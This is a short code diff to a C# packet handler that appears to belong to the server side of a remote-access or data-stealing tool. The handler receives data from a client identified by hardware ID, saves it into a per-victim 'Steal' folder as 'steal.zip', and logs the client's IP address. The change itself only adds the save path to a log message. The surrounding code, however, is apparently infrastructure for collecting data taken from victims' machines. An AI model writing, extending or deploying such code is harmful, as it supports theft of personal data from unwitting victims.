@@ -33,7 +33,7 @@ namespace Server.Handle_Packet
             try
             {
                 client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
-                
+                string temppath = Path.Combine("ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Steal");
                 string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Steal");
                 if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
 
@@ -46,7 +46,7 @@ namespace Server.Handle_Packet
                 string zipfilename = $"{fullPath}\\steal.zip";
                 if (File.Exists(zipfilename)) File.Delete(zipfilename);
                 File.WriteAllBytes(zipfilename, data);
-                new HandleLogs().Addmsg($"{client.Ip} Data is Saved!", Color.Blue);
+                new HandleLogs().Addmsg($"{client.Ip} Data is Saved to {temppath}!", Color.Blue);
             }
             catch (Exception ex)
             {
